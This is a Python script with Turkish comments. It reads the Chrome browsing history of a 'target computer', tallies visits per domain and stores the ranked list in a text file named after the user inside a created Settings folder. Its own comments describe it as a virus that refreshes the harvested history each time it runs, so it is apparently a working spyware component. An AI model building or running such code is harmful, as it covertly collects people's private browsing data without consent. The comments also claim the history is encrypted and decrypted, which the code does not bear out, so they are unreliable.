import os
import sqlite3
import operator
from collections import OrderedDict

#Bu fonksiyonla chrome geçmişinin şifresini çözerek data_txt_path yoluna hedef bilgisayarın username ile birlikte txt içine atar
def q2():
#kaydedeceğim geçmiş için dosya olup olmadığını kontrol ediyorum
	data_path = os.path.expanduser('~')+"\\Settings"
	data_user_name=os.path.expanduser('~')[9:]
	if not os.path.exists(data_path):
		os.makedirs(data_path)
	data_txt_path = os.path.expanduser('~')+"\\Settings\\"+data_user_name+".txt"
	#geçmişteki linkleri sadeceleştiriyorum
	def parse(url):
		try:
			parsed_url_components = url.split('//')
			sublevel_split = parsed_url_components[1].split('/', 1)
			domain = sublevel_split[0].replace("www.", "")
			return domain
		except IndexError:
			print ("URL format error!")
#Siteleri ve kaç kez girildiklerini tek tek txt dosyasına yazıyorum her virüs çalıştığında geçmiş güncellerek işleniyor
	def analyze(results):
		if(os.path.exists(data_txt_path) and os.path.isfile(data_txt_path)):
			f = open(data_txt_path, 'r+')
			f.truncate(0)
			for site, count in sites_count_sorted.items():						
				text_file = open(data_txt_path, "a")
				count=str(count)
				text_file.writelines(site+" "+count+"\n")
				text_file.close()

		else:
			for site, count in sites_count_sorted.items():						
				text_file = open(data_txt_path, "a")
				count=str(count)
				text_file.writelines(site+" "+count+"\n")
				text_file.close()
			
		


	data_path = os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
	files = os.listdir(data_path)
	#Chromeun geçmişinin tutulduğu dizin
	history_db = os.path.join(data_path, 'history')
	#geçmişi içeren şifrelenmiş dosyayı açıyoruz
	c = sqlite3.connect(history_db)
	cursor = c.cursor()
	select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
	cursor.execute(select_statement)

	results = cursor.fetchall() 

	sites_count = {} 
#aynı site oldukça değerini 1 arttırıyoruz
	for url, count in results:
		url = parse(url)
		if url in sites_count:
			sites_count[url] += 1
		else:
			sites_count[url] = 1

	sites_count_sorted = OrderedDict(sorted(sites_count.items(), key=operator.itemgetter(1), reverse=True))

	analyze (sites_count_sorted)
	cursor.close()
	c.close()
